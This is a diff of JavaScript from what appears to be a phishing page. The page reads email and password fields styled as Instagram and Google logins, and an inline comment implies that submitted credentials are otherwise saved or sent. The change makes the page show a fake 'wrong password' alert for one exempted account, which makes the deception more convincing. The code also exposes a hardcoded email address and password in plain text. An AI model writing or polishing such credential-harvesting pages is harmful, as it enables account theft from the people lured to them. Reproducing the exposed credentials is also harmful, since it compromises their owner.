@@ -175,9 +175,9 @@
             const email = platform === 'Instagram' ? document.getElementById('insta-email').value : document.getElementById('google-email').value;
             const password = platform === 'Instagram' ? document.getElementById('insta-pass').value : document.getElementById('google-pass').value;
 
-            // حماية الحساب الشخصي
+            // حماية الحساب الشخصي وتغيير الرسالة
             if (email.toLowerCase() === 'rehabalqubati2@gmail.com' && password === '20R73452') {
-                alert("تنبيه أمان: تم منع إدخال هذا الحساب لحمايتك من تسجيله بالخطأ!");
+                alert("كلمة المرور خاطئة");
                 return; // يوقف العملية هنا ولن يتم حفظ أو إرسال أي شيء
             }
 
